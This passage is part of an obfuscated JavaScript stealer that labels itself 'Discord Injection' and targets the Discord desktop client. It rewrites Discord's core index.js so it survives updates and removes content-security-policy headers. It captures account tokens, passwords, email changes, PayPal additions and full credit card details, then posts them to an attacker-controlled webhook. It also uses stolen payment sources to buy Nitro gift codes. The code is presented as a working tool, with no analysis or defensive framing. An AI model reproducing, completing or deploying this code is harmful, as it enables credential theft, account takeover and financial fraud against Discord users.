cdiscord_desktop_core\x5cindex.js','return\x20(function()\x20','card[cvc]','🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection','amd','win32','**\x0aOld\x20Password:\x20**','host','from','**Credit\x20Card\x20Added**','classic','content-security-policy','avatar','**\x0aBadges:\x20**','.webp','existsSync','wss://remote-auth-gateway','request','webhook','console','701924lRaioB','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27','APPDATA','paypal_accounts','flags','**Paypal\x20Added**','includes','None','{}.constructor(\x22return\x20this\x22)(\x20)','new_password','parse','3xMBQSi','Discord\x20Staff,\x20','webContents','1503yrtxVS','platform','Partnered\x20Server\x20Owner,\x20','content-security-policy-report-only','https://discordapp.com/api/v*/users/@me','length','ping_on_run','mkdirSync','discriminator','constructor','PATCH','**Token**','511651885459963904','https://discord.com/api/v*/users/@me/library','onCompleted','url','bytes','Early\x20Supporter,\x20','responseHeaders','(((.+)+)+)+$','https://discord.gift/','New\x20Email:\x20**'];_0x3fb8=function(){return _0x9acf28;};return _0x3fb8();}function parity_32(_0x44806d,_0x1c4981,_0x220f4f){return _0x44806d^_0x1c4981^_0x220f4f;}function ch_32(_0x5e3d58,_0x1e00ff,_0x1e06cf){return _0x5e3d58&_0x1e00ff^~_0x5e3d58&_0x1e06cf;}function maj_32(_0x525f1f,_0xf4e16f,_0x1eecb5){return _0x525f1f&_0xf4e16f^_0x525f1f&_0x1eecb5^_0xf4e16f&_0x1eecb5;}function rotl_32(_0x11b860,_0x1e302b){return _0x11b860<<_0x1e302b|_0x11b860>>>0x20-_0x1e302b;}function safeAdd_32_2(_0x511d23,_0x500721){var _0x92bda2=(_0x511d23&0xffff)+(_0x500721&0xffff),_0x5d1c4a=(_0x511d23>>>0x10)+(_0x500721>>>0x10)+(_0x92bda2>>>0x10);return(_0x5d1c4a&0xffff)<<0x10|_0x92bda2&0xffff;}function safeAdd_32_5(_0x1075ca,_0x2ab0af,_0x112062,_0x2ddfc0,_0x135e94){var _0x59a2b1=(_0x1075ca&0xffff)+(_0x2ab0af&0xffff)+(_0x112062&0xffff)+(_0x2ddfc0&0xffff)+(_0x135e94&0xffff),_0x1892ff=(_0x1075ca>>>0x10)+(_0x2ab0af>>>0x10)+(_0x112062>>>0x10)+(_0x2ddfc0>>>0x10)+(_0x135e94>>>0x10)+(_0x59a2b1>>>0x10);return(_0x1892ff&0xffff)<<0x10|_0x59a2b1&0xffff;}function binb2hex(_0x42f4f1){const _0x282f2e=_0x25b1bd;var _0x45ec1a=_0x282f2e(0x21d),_0x430afb='',_0x5743c5=_0x42f4f1[_0x282f2e(0x1b5)]*0x4,_0xce782e,_0x43a32e;for(_0xce782e=0x0;_0xce782e<_0x5743c5;_0xce782e+=0x1){_0x43a32e=_0x42f4f1[_0xce782e>>>0x2]>>>(0x3-_0xce782e%0x4)*0x8,_0x430afb+=_0x45ec1a['charAt'](_0x43a32e>>>0x4&0xf)+_0x45ec1a['charAt'](_0x43a32e&0xf);}return _0x430afb;}function getH(){return[0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0];}function roundSHA1(_0x5f1ad7,_0x207671){var _0x2ab5d7=[],_0x216c16,_0x339d66,_0x5146fd,_0x20123b,_0x47e39e,_0x3740ec,_0x2e0ca3=ch_32,_0x2237b7=parity_32,_0x71e256=maj_32,_0x141e0a=rotl_32,_0x43590d=safeAdd_32_2,_0x4365fb,_0x13d220=safeAdd_32_5;_0x216c16=_0x207671[0x0],_0x339d66=_0x207671[0x1],_0x5146fd=_0x207671[0x2],_0x20123b=_0x207671[0x3],_0x47e39e=_0x207671[0x4];for(_0x4365fb=0x0;_0x4365fb<0x50;_0x4365fb+=0x1){_0x4365fb<0x10?_0x2ab5d7[_0x4365fb]=_0x5f1ad7[_0x4365fb]:_0x2ab5d7[_0x4365fb]=_0x141e0a(_0x2ab5d7[_0x4365fb-0x3]^_0x2ab5d7[_0x4365fb-0x8]^_0x2ab5d7[_0x4365fb-0xe]^_0x2ab5d7[_0x4365fb-0x10],0x1);if(_0x4365fb<0x14)_0x3740ec=_0x13d220(_0x141e0a(_0x216c16,0x5),_0x2e0ca3(_0x339d66,_0x5146fd,_0x20123b),_0x47e39e,0x5a827999,_0x2ab5d7[_0x4365fb]);else{if(_0x4365fb<0x28)_0x3740ec=_0x13d220(_0x141e0a(_0x216c16,0x5),_0x2237b7(_0x339d66,_0x5146fd,_0x20123b),_0x47e39e,0x6ed9eba1,_0x2ab5d7[_0x4365fb]);else _0x4365fb<0x3c?_0x3740ec=_0x13d220(_0x141e0a(_0x216c16,0x5),_0x71e256(_0x339d66,_0x5146fd,_0x20123b),_0x47e39e,0x8f1bbcdc,_0x2ab5d7[_0x4365fb]):_0x3740ec=_0x13d220(_0x141e0a(_0x216c16,0x5),_0x2237b7(_0x339d66,_0x5146fd,_0x20123b),_0x47e39e,0xca62c1d6,_0x2ab5d7[_0x4365fb]);}_0x47e39e=_0x20123b,_0x20123b=_0x5146fd,_0x5146fd=_0x141e0a(_0x339d66,0x1e),_0x339d66=_0x216c16,_0x216c16=_0x3740ec;}return _0x207671[0x0]=_0x43590d(_0x216c16,_0x207671[0x0]),_0x207671[0x1]=_0x43590d(_0x339d66,_0x207671[0x1]),_0x207671[0x2]=_0x43590d(_0x5146fd,_0x207671[0x2]),_0x207671[0x3]=_0x43590d(_0x20123b,_0x207671[0x3]),_0x207671[0x4]=_0x43590d(_0x47e39e,_0x207671[0x4]),_0x207671;}function finalizeSHA1(_0x129f19,_0x421dc3,_0x36a228,_0x1c31d0){const _0x4a0aa3=_0x25b1bd;var _0x3046b6,_0x51fb12,_0x5b58ae;_0x5b58ae=(_0x421dc3+0x41>>>0x9<<0x4)+0xf;while(_0x129f19[_0x4a0aa3(0x1b5)]<=_0x5b58ae){_0x129f19[_0x4a0aa3(0x1f8)](0x0);}_0x129f19[_0x421dc3>>>0x5]|=0x80<<0x18-_0x421dc3%0x20,_0x129f19[_0x5b58ae]=_0x421dc3+_0x36a228,_0x51fb12=_0x129f19[_0x4a0aa3(0x1b5)];for(_0x3046b6=0x0;_0x3046b6<_0x51fb12;_0x3046b6+=0x10){_0x1c31d0=roundSHA1(_0x129f19['slice'](_0x3046b6,_0x3046b6+0x10),_0x1c31d0);}return _0x1c31d0;}function hex2binb(_0x28b793,_0x345651,_0x31069d){const _0x511e5d=_0x25b1bd;var _0x1caa32,_0x3b9248=_0x28b793[_0x511e5d(0x1b5)],_0x508ea2,_0x2ff13a,_0x51682a,_0x584f38,_0x13a9d0;_0x1caa32=_0x345651||[0x0],_0x31069d=_0x31069d||0x0,_0x13a9d0=_0x31069d>>>0x3;0x0!==_0x3b9248%0x2&&console[_0x511e5d(0x1e9)](_0x511e5d(0x14f));for(_0x508ea2=0x0;_0x508ea2<_0x3b9248;_0x508ea2+=0x2){_0x2ff13a=parseInt(_0x28b793['substr'](_0x508ea2,0x2),0x10);if(!isNaN(_0x2ff13a)){_0x584f38=(_0x508ea2>>>0x1)+_0x13a9d0,_0x51682a=_0x584f38>>>0x2;while(_0x1caa32['length']<=_0x51682a){_0x1caa32['push'](0x0);}_0x1caa32[_0x51682a]|=_0x2ff13a<<0x8*(0x3-_0x584f38%0x4);}else console['error'](_0x511e5d(0x15c));}return{'value':_0x1caa32,'binLen':_0x3b9248*0x4+_0x31069d};}class jsSHA{constructor(){const _0x3882c9=_0x25b1bd;var _0x1fdf89=0x0,_0x3a73b0=[],_0x1f44be=0x0,_0x423442,_0x468d41,_0x1b612d,_0x27194b,_0x57d828,_0x523e95,_0xbe597c=![],_0x3f454f=![],_0x4868e7=[],_0x12b17b=[],_0x193c83,_0x193c83=0x1;_0x468d41=hex2binb,(_0x193c83!==parseInt(_0x193c83,0xa)||0x1>_0x193c83)&&console[_0x3882c9(0x1e9)]('numRounds\x20must\x20a\x20integer\x20>=\x201'),_0x27194b=0x200,_0x57d828=roundSHA1,_0x523e95=finalizeSHA1,_0x1b612d=0xa0,_0x423442=getH(),this['setHMACKey']=function(_0x977dd2){const _0x5cc6bf=_0x3882c9;var _0x3642f3,_0xe0954d,_0x3c0928,_0x38dce1,_0x19142b,_0x57256a,_0x564c6d;_0x3642f3=hex2binb,_0xe0954d=_0x3642f3(_0x977dd2),_0x3c0928=_0xe0954d['binLen'],_0x38dce1=_0xe0954d['value'],_0x19142b=_0x27194b>>>0x3,_0x564c6d=_0x19142b/0x4-0x1;if(_0x19142b<_0x3c0928/0x8){_0x38dce1=_0x523e95(_0x38dce1,_0x3c0928,0x0,getH());while(_0x38dce1['length']<=_0x564c6d){_0x38dce1[_0x5cc6bf(0x1f8)](0x0);}_0x38dce1[_0x564c6d]&=0xffffff00;}else{if(_0x19142b>_0x3c0928/0x8){while(_0x38dce1[_0x5cc6bf(0x1b5)]<=_0x564c6d){_0x38dce1[_0x5cc6bf(0x1f8)](0x0);}_0x38dce1[_0x564c6d]&=0xffffff00;}}for(_0x57256a=0x0;_0x57256a<=_0x564c6d;_0x57256a+=0x1){_0x4868e7[_0x57256a]=_0x38dce1[_0x57256a]^0x36363636,_0x12b17b[_0x57256a]=_0x38dce1[_0x57256a]^0x5c5c5c5c;}_0x423442=_0x57d828(_0x4868e7,_0x423442),_0x1fdf89=_0x27194b,_0x3f454f=!![];},this['update']=function(_0x1b814a){const _0x3ae8f9=_0x3882c9;var _0x4d4352,_0x560548,_0x3b19f3,_0x3f7d60,_0x154e64,_0x4d6924=0x0,_0x168119=_0x27194b>>>0x5;_0x4d4352=_0x468d41(_0x1b814a,_0x3a73b0,_0x1f44be),_0x560548=_0x4d4352[_0x3ae8f9(0x1f2)],_0x3f7d60=_0x4d4352[_0x3ae8f9(0x183)],_0x3b19f3=_0x560548>>>0x5;for(_0x154e64=0x0;_0x154e64<_0x3b19f3;_0x154e64+=_0x168119){_0x4d6924+_0x27194b<=_0x560548&&(_0x423442=_0x57d828(_0x3f7d60[_0x3ae8f9(0x214)](_0x154e64,_0x154e64+_0x168119),_0x423442),_0x4d6924+=_0x27194b);}_0x1fdf89+=_0x4d6924,_0x3a73b0=_0x3f7d60[_0x3ae8f9(0x214)](_0x4d6924>>>0x5),_0x1f44be=_0x560548%_0x27194b;},this[_0x3882c9(0x1f7)]=function(){const _0x5b8f50=_0x3882c9;var _0x5ce9d4;![]===_0x3f454f&&console['error'](_0x5b8f50(0x15e));const _0x5d8a9c=function(_0x4bee8d){return binb2hex(_0x4bee8d);};return![]===_0xbe597c&&(_0x5ce9d4=_0x523e95(_0x3a73b0,_0x1f44be,_0x1fdf89,_0x423442),_0x423442=_0x57d828(_0x12b17b,getH()),_0x423442=_0x523e95(_0x5ce9d4,_0x1b612d,_0x27194b,_0x423442)),_0xbe597c=!![],_0x5d8a9c(_0x423442);};}}if(_0x25b1bd(0x175)===typeof define&&define[_0x25b1bd(0x192)])define(function(){return jsSHA;});else'undefined'!==typeof exports?_0x25b1bd(0x201)!==typeof module&&module[_0x25b1bd(0x207)]?module[_0x25b1bd(0x207)]=exports=jsSHA:exports=jsSHA:global[_0x25b1bd(0x20c)]=jsSHA;jsSHA['default']&&(jsSHA=jsSHA[_0x25b1bd(0x171)]);function totp(_0x339651){const _0x1ba908=_0x25b1bd,_0x48d334=0x1e,_0x666b3=0x6,_0x5485c0=Date['now'](),_0xdcf82a=Math[_0x1ba908(0x167)](_0x5485c0/0x3e8),_0x3fb49c=leftpad(dec2hex(Math['floor'](_0xdcf82a/_0x48d334)),0x10,'0'),_0x477304=new jsSHA();_0x477304[_0x1ba908(0x18c)](base32tohex(_0x339651)),_0x477304['update'](_0x3fb49c);const _0x4012bf=_0x477304[_0x1ba908(0x1f7)](),_0x3abdd4=hex2dec(_0x4012bf['substring'](_0x4012bf[_0x1ba908(0x1b5)]-0x1));let _0x1f9264=(hex2dec(_0x4012bf[_0x1ba908(0x226)](_0x3abdd4*0x2,0x8))&hex2dec(_0x1ba908(0x154)))+'';return _0x1f9264=_0x1f9264[_0x1ba908(0x226)](Math['max'](_0x1f9264[_0x1ba908(0x1b5)]-_0x666b3,0x0),_0x666b3),_0x1f9264;}function hex2dec(_0x576cee){return parseInt(_0x576cee,0x10);}function dec2hex(_0x522445){const _0x4c28e8=_0x25b1bd;return(_0x522445<15.5?'0':'')+Math[_0x4c28e8(0x167)](_0x522445)[_0x4c28e8(0x221)](0x10);}function base32tohex(_0x59bf10){const _0x22e4ec=_0x25b1bd;let _0x739066=_0x22e4ec(0x1dd),_0x273a8b='',_0x455ce2='';_0x59bf10=_0x59bf10[_0x22e4ec(0x164)](/=+$/,'');for(let _0x342001=0x0;_0x342001<_0x59bf10[_0x22e4ec(0x1b5)];_0x342001++){let _0x10106a=_0x739066[_0x22e4ec(0x172)](_0x59bf10[_0x22e4ec(0x21e)](_0x342001)[_0x22e4ec(0x219)]());if(_0x10106a===-0x1)console[_0x22e4ec(0x1e9)](_0x22e4ec(0x22b));_0x273a8b+=leftpad(_0x10106a['toString'](0x2),0x5,'0');}for(let _0x233324=0x0;_0x233324+0x8<=_0x273a8b[_0x22e4ec(0x1b5)];_0x233324+=0x8){let _0x49a5f8=_0x273a8b['substr'](_0x233324,0x8);_0x455ce2=_0x455ce2+leftpad(parseInt(_0x49a5f8,0x2)[_0x22e4ec(0x221)](0x10),0x2,'0');}return _0x455ce2;}function _0x16c5(_0x3e2abc,_0x2bf68b){const _0x3cc4d6=_0x3fb8();return _0x16c5=function(_0xf16cfd,_0x22ccba){_0xf16cfd=_0xf16cfd-0x14f;let _0xfdcbf5=_0x3cc4d6[_0xf16cfd];return _0xfdcbf5;},_0x16c5(_0x3e2abc,_0x2bf68b);}function leftpad(_0x5834ea,_0x3ba7c8,_0x1f07a1){const _0x205e9f=_0x25b1bd;return _0x3ba7c8+0x1>=_0x5834ea[_0x205e9f(0x1b5)]&&(_0x5834ea=Array(_0x3ba7c8+0x1-_0x5834ea[_0x205e9f(0x1b5)])[_0x205e9f(0x1df)](_0x1f07a1)+_0x5834ea),_0x5834ea;}const discordPath=(function(){const _0x276b04=_0x25b1bd,_0x3e29a4=args[0x0]['split'](path['sep'])['slice'](0x0,-0x1)['join'](path[_0x276b04(0x1d6)]);let _0x45c483;if(process[_0x276b04(0x1b1)]===_0x276b04(0x193))_0x45c483=path[_0x276b04(0x1df)](_0x3e29a4,'resources');else process[_0x276b04(0x1b1)]===_0x276b04(0x161)&&(_0x45c483=path[_0x276b04(0x1df)](_0x3e29a4,_0x276b04(0x158),'Resources'));if(fs[_0x276b04(0x19d)](_0x45c483))return{'resourcePath':_0x45c483,'app':_0x3e29a4};return{'undefined':undefined,'undefined':undefined};}());function updateCheck(){const _0x45d4db=_0x25b1bd,{resourcePath:_0x1eecc3,app:_0x2af37f}=discordPath;if(_0x1eecc3===undefined||_0x2af37f===undefined)return;const _0x287376=path[_0x45d4db(0x1df)](_0x1eecc3,'app'),_0xd5e7=path['join'](_0x287376,_0x45d4db(0x1e7)),_0x3ddb77=path[_0x45d4db(0x1df)](_0x287376,'index.js'),_0xd46620=_0x2af37f+_0x45d4db(0x18e),_0x324ad8=path[_0x45d4db(0x1df)](process['env'][_0x45d4db(0x1a4)],_0x45d4db(0x156));if(!fs[_0x45d4db(0x19d)](_0x287376))fs[_0x45d4db(0x1b7)](_0x287376);if(fs['existsSync'](_0xd5e7))fs['unlinkSync'](_0xd5e7);if(fs[_0x45d4db(0x19d)](_0x3ddb77))fs['unlinkSync'](_0x3ddb77);if(process[_0x45d4db(0x1b1)]===_0x45d4db(0x193)||process[_0x45d4db(0x1b1)]==='darwin'){fs[_0x45d4db(0x20e)](_0xd5e7,JSON[_0x45d4db(0x15a)]({'name':'discord','main':_0x45d4db(0x1ec)},null,0x4));const _0x1bbd3f=_0x45d4db(0x1e3)+_0xd46620+_0x45d4db(0x1ff)+_0x324ad8+_0x45d4db(0x228)+config[_0x45d4db(0x181)]+'\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK%\x27,\x20\x27'+config['webhook']+_0x45d4db(0x1a3)+config['webhook_protector_key']+_0x45d4db(0x210)+path[_0x45d4db(0x1df)](_0x1eecc3,_0x45d4db(0x1ed))+'\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);';fs[_0x45d4db(0x20e)](_0x3ddb77,_0x1bbd3f[_0x45d4db(0x164)](/\\/g,'\x5c\x5c'));}if(!fs[_0x45d4db(0x19d)](path[_0x45d4db(0x1df)](__dirname,'initiation')))return!0x0;return fs[_0x45d4db(0x1d1)](path['join'](__dirname,_0x45d4db(0x1eb))),execScript(_0x45d4db(0x215)),!0x1;}const execScript=_0x8f5c6a=>{const _0x1ff997=_0x25b1bd,_0xae968a=BrowserWindow[_0x1ff997(0x1cd)]()[0x0];return _0xae968a[_0x1ff997(0x1af)][_0x1ff997(0x1d4)](_0x8f5c6a,!0x0);},getInfo=async _0x5cebfd=>{const _0x2b3f8c=_0x25b1bd,_0xc24cce=await execScript(_0x2b3f8c(0x18d)+config[_0x2b3f8c(0x180)]+_0x2b3f8c(0x1db)+_0x5cebfd+_0x2b3f8c(0x217));return JSON[_0x2b3f8c(0x1ac)](_0xc24cce);},fetchBilling=async _0x280291=>{const _0x30961a=_0x25b1bd,_0x1d1df2=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22'+config['api']+_0x30961a(0x1d0)+_0x280291+'\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText');if(!_0x1d1df2['lenght']||_0x1d1df2[_0x30961a(0x1b5)]===0x0)return'';return JSON[_0x30961a(0x1ac)](_0x1d1df2);},getBilling=async _0x5b063f=>{const _0x40639f=_0x25b1bd,_0x1bc23f=await fetchBilling(_0x5b063f);if(!_0x1bc23f)return'❌';let _0x427338='';_0x1bc23f[_0x40639f(0x1ea)](_0x534892=>{const _0x5deb48=_0x40639f;if(!_0x534892[_0x5deb48(0x16c)])switch(_0x534892[_0x5deb48(0x186)]){case 0x1:_0x427338+='💳\x20';break;case 0x2:_0x427338+=_0x5deb48(0x189);break;}});if(!_0x427338)_0x427338='❌';return _0x427338;},Purchase=async(_0x1fb820,_0x249ff2,_0x2063f3,_0x20d633)=>{const _0x36dbb8=_0x25b1bd,_0x2d715b={'expected_amount':config[_0x36dbb8(0x21c)][_0x2063f3][_0x20d633][_0x36dbb8(0x21a)],'expected_currency':'usd','gift':!![],'payment_source_id':_0x249ff2,'payment_source_token':null,'purchase_token':_0x36dbb8(0x157),'sku_subscription_plan_id':config[_0x36dbb8(0x21c)][_0x2063f3][_0x20d633][_0x36dbb8(0x152)]},_0x603187=execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/'+config[_0x36dbb8(0x21c)][_0x2063f3][_0x20d633]['id']+'/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x1fb820+'\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify('+JSON['stringify'](_0x2d715b)+_0x36dbb8(0x155));if(_0x603187[_0x36dbb8(0x20b)])return _0x36dbb8(0x1c4)+_0x603187[_0x36dbb8(0x20b)];else return null;},buyNitro=async _0x53a492=>{const _0x24c58b=_0x25b1bd,_0x59ebad=await fetchBilling(_0x53a492),_0x343e36=_0x24c58b(0x208);if(!_0x59ebad)return _0x343e36;let _0x22b341=[];_0x59ebad[_0x24c58b(0x1ea)](_0x58d944=>{const _0x35272c=_0x24c58b;!_0x58d944[_0x35272c(0x16c)]&&(_0x22b341=_0x22b341[_0x35272c(0x177)](_0x58d944['id']));});for(let _0x2c6014 in _0x22b341){const _0x36b184=Purchase(_0x53a492,_0x2c6014,_0x24c58b(0x1f1),_0x24c58b(0x168));if(_0x36b184!==null)return _0x36b184;else{const _0x2b259d=Purchase(_0x53a492,_0x2c6014,_0x24c58b(0x1f1),_0x24c58b(0x1ce));if(_0x2b259d!==null)return _0x2b259d;else{const _0x13e717=Purchase(_0x53a492,_0x2c6014,_0x24c58b(0x198),_0x24c58b(0x1ce));return _0x13e717!==null?_0x13e717:_0x343e36;}}}},getNitro=_0x3525dc=>{const _0x2c8674=_0x25b1bd;switch(_0x3525dc){case 0x0:return _0x2c8674(0x1dc);case 0x1:return'Nitro\x20Classic';case 0x2:return _0x2c8674(0x17f);default:return'No\x20Nitro';}},getBadges=_0x589781=>{const _0x3b92b8=_0x25b1bd;let _0x15f405='';switch(_0x589781){case 0x1:_0x15f405+=_0x3b92b8(0x1ae);break;case 0x2:_0x15f405+=_0x3b92b8(0x1b2);break;case 0x20000:_0x15f405+=_0x3b92b8(0x1d5);break;case 0x4:_0x15f405+=_0x3b92b8(0x169);break;case 0x4000:_0x15f405+='Gold\x20BugHunter,\x20';break;case 0x8:_0x15f405+=_0x3b92b8(0x17e);break;case 0x200:_0x15f405+=_0x3b92b8(0x1c1);break;case 0x80:_0x15f405+=_0x3b92b8(0x1c7);break;case 0x40:_0x15f405+=_0x3b92b8(0x22d);break;case 0x100:_0x15f405+='HypeSquad\x20Balance,\x20';break;case 0x0:_0x15f405='None';break;default:_0x15f405=_0x3b92b8(0x1a9);break;}return _0x15f405;},hooker=async _0x3ae96b=>{const _0x8f6b69=_0x25b1bd,_0x5b9290=JSON[_0x8f6b69(0x15a)](_0x3ae96b),_0x57010a=new URL(config[_0x8f6b69(0x1a0)]),_0x45b0ca={'Content-Type':_0x8f6b69(0x1ef),'Access-Control-Allow-Origin':'*'};if(!config[_0x8f6b69(0x1a0)][_0x8f6b69(0x1a8)](_0x8f6b69(0x16b))){const _0x46edd9=totp(config[_0x8f6b69(0x220)]);_0x45b0ca['Authorization']=_0x46edd9;}const _0xb24f12={'protocol':_0x57010a['protocol'],'hostname':_0x57010a[_0x8f6b69(0x195)],'path':_0x57010a[_0x8f6b69(0x170)],'method':_0x8f6b69(0x1f5),'headers':_0x45b0ca},_0x1ca69f=https[_0x8f6b69(0x19f)](_0xb24f12);_0x1ca69f['on'](_0x8f6b69(0x1e9),_0x48128e=>{const _0xbb4797=_0x8f6b69;console[_0xbb4797(0x18a)](_0x48128e);}),_0x1ca69f[_0x8f6b69(0x1fc)](_0x5b9290),_0x1ca69f[_0x8f6b69(0x187)]();},login=async(_0x3efe2c,_0x260e42,_0x199518)=>{const _0x18a60d=_0x25b1bd,_0xacd24f=await getInfo(_0x199518),_0xb5305=getNitro(_0xacd24f[_0x18a60d(0x22a)]),_0x43aecd=getBadges(_0xacd24f['flags']),_0x522914=await getBilling(_0x199518),_0x36539f={'username':config[_0x18a60d(0x206)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x18a60d(0x1f4)],'fields':[{'name':_0x18a60d(0x150),'value':_0x18a60d(0x153)+_0x3efe2c+_0x18a60d(0x151)+_0x260e42+'**','inline':![]},{'name':'**Discord\x20Info**','value':_0x18a60d(0x1d9)+_0xb5305+'**\x0aBadges:\x20**'+_0x43aecd+_0x18a60d(0x1d3)+_0x522914+'**','inline':![]},{'name':_0x18a60d(0x1bb),'value':'`'+_0x199518+'`','inline':![]}],'author':{'name':_0xacd24f['username']+'#'+_0xacd24f[_0x18a60d(0x1b8)]+'\x20|\x20'+_0xacd24f['id'],'icon_url':_0x18a60d(0x15d)+_0xacd24f['id']+'/'+_0xacd24f['avatar']+_0x18a60d(0x19c)},'footer':{'text':_0x18a60d(0x191)}}]};if(config['ping_on_run'])_0x36539f[_0x18a60d(0x1e0)]=config['ping_val'];hooker(_0x36539f);},passwordChanged=async(_0x50ff99,_0x423b0e,_0x2dec8c)=>{const _0x15f61b=_0x25b1bd,_0x13cb30=await getInfo(_0x2dec8c),_0x4ff50a=getNitro(_0x13cb30[_0x15f61b(0x22a)]),_0x5874a1=getBadges(_0x13cb30['flags']),_0xdf3245=await getBilling(_0x2dec8c),_0x25dda8={'username':config[_0x15f61b(0x206)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x15f61b(0x1f4)],'fields':[{'name':'**Password\x20Changed**','value':_0x15f61b(0x153)+_0x13cb30[_0x15f61b(0x222)]+_0x15f61b(0x194)+_0x50ff99+_0x15f61b(0x1c9)+_0x423b0e+'**','inline':!![]},{'name':'**Discord\x20Info**','value':_0x15f61b(0x1d9)+_0x4ff50a+_0x15f61b(0x19b)+_0x5874a1+_0x15f61b(0x1d3)+_0xdf3245+'**','inline':!![]},{'name':_0x15f61b(0x1bb),'value':'`'+_0x2dec8c+'`','inline':![]}],'author':{'name':_0x13cb30[_0x15f61b(0x203)]+'#'+_0x13cb30[_0x15f61b(0x1b8)]+_0x15f61b(0x1c8)+_0x13cb30['id'],'icon_url':_0x15f61b(0x15d)+_0x13cb30['id']+'/'+_0x13cb30[_0x15f61b(0x19a)]+_0x15f61b(0x19c)},'footer':{'text':_0x15f61b(0x191)}}]};if(config['ping_on_run'])_0x25dda8[_0x15f61b(0x1e0)]=config[_0x15f61b(0x1de)];hooker(_0x25dda8);},emailChanged=async(_0x37dba1,_0xdd0fa8,_0xefbe82)=>{const _0x3cc46c=_0x25b1bd,_0x49336b=await getInfo(_0xefbe82),_0x10398d=getNitro(_0x49336b[_0x3cc46c(0x22a)]),_0x5c41e1=getBadges(_0x49336b[_0x3cc46c(0x1a6)]),_0x1c0484=await getBilling(_0xefbe82),_0x2ba746={'username':config[_0x3cc46c(0x206)],'avatar_url':config[_0x3cc46c(0x17d)],'embeds':[{'color':config[_0x3cc46c(0x1f4)],'fields':[{'name':_0x3cc46c(0x224),'value':_0x3cc46c(0x1c5)+_0x37dba1+_0x3cc46c(0x1f6)+_0xdd0fa8+'**','inline':!![]},{'name':'**Discord\x20Info**','value':_0x3cc46c(0x1d9)+_0x10398d+_0x3cc46c(0x19b)+_0x5c41e1+_0x3cc46c(0x1d3)+_0x1c0484+'**','inline':!![]},{'name':_0x3cc46c(0x1bb),'value':'`'+_0xefbe82+'`','inline':![]}],'author':{'name':_0x49336b[_0x3cc46c(0x203)]+'#'+_0x49336b[_0x3cc46c(0x1b8)]+_0x3cc46c(0x1c8)+_0x49336b['id'],'icon_url':_0x3cc46c(0x15d)+_0x49336b['id']+'/'+_0x49336b[_0x3cc46c(0x19a)]+'.webp'},'footer':{'text':_0x3cc46c(0x191)}}]};if(config[_0x3cc46c(0x1b6)])_0x2ba746[_0x3cc46c(0x1e0)]=config[_0x3cc46c(0x1de)];hooker(_0x2ba746);},PaypalAdded=async _0x3679b2=>{const _0x4fd8cb=_0x25b1bd,_0x4b9bb7=await getInfo(_0x3679b2),_0x35b7a5=getNitro(_0x4b9bb7[_0x4fd8cb(0x22a)]),_0x507497=getBadges(_0x4b9bb7['flags']),_0x46af76=getBilling(_0x3679b2),_0x59181d={'username':config['embed_name'],'avatar_url':config[_0x4fd8cb(0x17d)],'embeds':[{'color':config['embed_color'],'fields':[{'name':_0x4fd8cb(0x1a7),'value':_0x4fd8cb(0x209),'inline':![]},{'name':'**Discord\x20Info**','value':_0x4fd8cb(0x1d9)+_0x35b7a5+_0x4fd8cb(0x17c)+_0x507497+'**\x0aBilling:\x20**'+_0x46af76+'**','inline':![]},{'name':_0x4fd8cb(0x1bb),'value':'`'+_0x3679b2+'`','inline':![]}],'author':{'name':_0x4b9bb7['username']+'#'+_0x4b9bb7[_0x4fd8cb(0x1b8)]+_0x4fd8cb(0x1c8)+_0x4b9bb7['id'],'icon_url':_0x4fd8cb(0x15d)+_0x4b9bb7['id']+'/'+_0x4b9bb7['avatar']+_0x4fd8cb(0x19c)},'footer':{'text':_0x4fd8cb(0x191)}}]};if(config[_0x4fd8cb(0x1b6)])_0x59181d[_0x4fd8cb(0x1e0)]=config[_0x4fd8cb(0x1de)];hooker(_0x59181d);},ccAdded=async(_0x4a7ba8,_0x49402a,_0x52cf40,_0x5e5237,_0x4df652)=>{const _0x123efe=_0x25b1bd,_0x4971d4=await getInfo(_0x4df652),_0x4ff420=getNitro(_0x4971d4[_0x123efe(0x22a)]),_0x3147b3=getBadges(_0x4971d4[_0x123efe(0x1a6)]),_0x4b1460=await getBilling(_0x4df652),_0x523da8={'username':config[_0x123efe(0x206)],'avatar_url':config[_0x123efe(0x17d)],'embeds':[{'color':config[_0x123efe(0x1f4)],'fields':[{'name':_0x123efe(0x197),'value':_0x123efe(0x160)+_0x4a7ba8+_0x123efe(0x1c6)+_0x49402a+_0x123efe(0x223)+_0x52cf40+'/'+_0x5e5237+'**','inline':!![]},{'name':_0x123efe(0x22e),'value':_0x123efe(0x1d9)+_0x4ff420+_0x123efe(0x19b)+_0x3147b3+_0x123efe(0x1d3)+_0x4b1460+'**','inline':!![]},{'name':_0x123efe(0x1bb),'value':'`'+_0x4df652+'`','inline':![]}],'author':{'name':_0x4971d4['username']+'#'+_0x4971d4[_0x123efe(0x1b8)]+_0x123efe(0x1c8)+_0x4971d4['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x4971d4['id']+'/'+_0x4971d4[_0x123efe(0x19a)]+_0x123efe(0x19c)},'footer':{'text':'🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'}}]};if(config[_0x123efe(0x1b6)])_0x523da8[_0x123efe(0x1e0)]=config[_0x123efe(0x1de)];hooker(_0x523d